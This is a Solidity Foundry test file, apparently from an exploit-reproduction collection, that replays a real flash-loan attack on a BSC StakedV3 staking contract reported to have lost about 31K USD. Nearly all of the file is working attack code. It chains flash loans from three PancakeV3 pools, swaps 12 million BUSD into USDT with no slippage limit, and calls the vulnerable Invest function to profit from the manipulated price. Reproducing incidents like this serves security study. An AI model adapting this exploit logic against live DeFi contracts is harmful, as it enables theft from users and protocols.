// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~31K USD$
// Attacker : https://bscscan.com/address/0x3a10408fd7a2b2a43bd14a17c0d4568430b93132
// Attack Contract : https://bscscan.com/address/0x18703a4fd7b3688607abf25424b6ab304def2512
// Vulnerable Contract : https://bscscan.com/address/0xb8dc09eec82cab2e86c7edc8dd5882dd92d22411
// Attack Tx : https://bscscan.com/tx/0x557628123d137ea49564e4dccff5f5d1e508607e96dd20fe99a670519b679cb5

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xb8dc09eec82cab2e86c7edc8dd5882dd92d22411#code

// @Analysis
// Twitter Guy : https://twitter.com/Phalcon_xyz/status/1680961588323557376

interface IStakedV3 {
    function Invest(
        uint256 id,
        uint256 amount,
        uint256 quoteAmount,
        uint256 investType,
        uint256 cycle,
        uint256 deadline
    ) external payable;
}

contract ContractTest is Test {
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Router_V3 Router = Uni_Router_V3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
    Uni_Pair_V3 Pair1 = Uni_Pair_V3(0x22536030B9cE783B6Ddfb9a39ac7F439f568E5e6);
    Uni_Pair_V3 Pair2 = Uni_Pair_V3(0x85FAac652b707FDf6907EF726751087F9E0b6687);
    Uni_Pair_V3 Pair3 = Uni_Pair_V3(0x369482C78baD380a036cAB827fE677C1903d1523);
    IStakedV3 StakedV3 = IStakedV3(0xB8dC09Eec82CaB2E86C7EdC8DD5882dd92d22411);

    function setUp() public {
        vm.createSelectFork("bsc", 30_043_573);
        vm.label(address(BUSD), "BUSD");
        vm.label(address(USDT), "USDT");
        vm.label(address(Router), "Router");
        vm.label(address(Pair1), "Pair1");
        vm.label(address(Pair2), "Pair2");
        vm.label(address(StakedV3), "StakedV3");
    }

    function testExploit() public {
        USDT.approve(address(Router), type(uint256).max);
        BUSD.approve(address(Router), type(uint256).max);
        BUSD.approve(address(StakedV3), type(uint256).max);
        BUSD.approve(address(StakedV3), type(uint256).max);
        Pair1.flash(address(this), 0, BUSD.balanceOf(address(Pair1)), abi.encode(BUSD.balanceOf(address(Pair1))));

        emit log_named_decimal_uint(
            "Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
        );
    }

    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (msg.sender == address(Pair1)) {
            Pair2.flash(address(this), 0, BUSD.balanceOf(address(Pair2)), abi.encode(BUSD.balanceOf(address(Pair2))));
            uint256 repayAmount = abi.decode(data, (uint256));
            BUSD.transfer(address(Pair1), repayAmount + amount1);
        } else if (msg.sender == address(Pair2)) {
            Pair3.flash(address(this), 0, BUSD.balanceOf(address(Pair3)), abi.encode(BUSD.balanceOf(address(Pair3))));
            uint256 repayAmount = abi.decode(data, (uint256));
            BUSD.transfer(address(Pair2), repayAmount + amount1);
        } else if (msg.sender == address(Pair3)) {
            BUSDToUSDT();
            StakedV3.Invest(2, 1 ether, 2, 1, 7, block.timestamp + 1000); // remove liquidity and swap BUSD to USDT
            USDTToBUSD();
            uint256 repayAmount = abi.decode(data, (uint256));
            BUSD.transfer(address(Pair3), repayAmount + amount1);
        }
    }

    function BUSDToUSDT() internal {
        bytes memory path = abi.encodePacked(address(BUSD), uint24(100), address(USDT));
        address recipient = address(this);
        uint256 amountIn = 12_000_000 ether;
        uint256 amountOutMinimum = 0;
        Uni_Router_V3.ExactInputParams memory ExactInputParams =
            Uni_Router_V3.ExactInputParams(path, recipient, amountIn, amountOutMinimum);
        Router.exactInput(ExactInputParams);
    }

    function USDTToBUSD() internal {
        bytes memory path = abi.encodePacked(address(USDT), uint24(100), address(BUSD));
        address recipient = address(this);
        uint256 amountIn = USDT.balanceOf(address(this));
        uint256 amountOutMinimum = 0;
        Uni_Router_V3.ExactInputParams memory ExactInputParams =
            Uni_Router_V3.ExactInputParams(path, recipient, amountIn, amountOutMinimum);
        Router.exactInput(ExactInputParams);
    }
}
